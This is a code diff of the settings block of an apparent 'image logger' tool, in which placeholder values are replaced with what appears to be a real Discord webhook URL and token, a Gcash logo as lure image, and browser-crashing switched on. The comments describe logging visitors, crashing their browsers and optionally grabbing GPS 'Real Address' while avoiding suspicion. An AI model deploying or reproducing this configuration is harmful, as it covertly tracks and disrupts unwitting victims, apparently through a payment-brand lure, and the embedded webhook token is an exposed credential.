@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1297245016900632738/lSXgvJzw8Ox_DwDfxUuqWPpuBkS39FoMyUWbt7jwo01AAY9OwXNFKle-dCC5u_w_CdaG",
+    "image": "https://www.google.com/search?client=ms-android-oppo-rev1&sca_esv=6298c17d4a9e2aad&sxsrf=ADLYWIKEOPflKy4WZt5TbM1Zv5lpKXxLhg:1729357817416&q=Gcash+logo&udm=2&fbs=AEQNm0Aa4sjWe7Rqy32pFwRj0UkWd8nbOJfsBGGB5IQQO6L3J03RPjGV0MznOJ6Likin94qDIATdUvfQeu3T2VSAcKxzUaekAcLGnoUBmvCvE0MaMzFZrVZf09fSp-C8GJf-S2fhzmMRddYSN7QeJ-84dFwECHidByMAhMSaK2l0JvOtmjd2oLq2zrZ7AOx9XaTh-2wiLvo3-VyrvYkjU58XBdjS92q3qg&sa=X&ved=2ahUKEwjR6ZXz95qJAxX9GRAIHbFdGw4QtKgLegQIDhAB&biw=360&bih=672&dpr=3#vhid=pzq4il6NEkRSeM&vssid=mosaic", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -22,7 +22,7 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
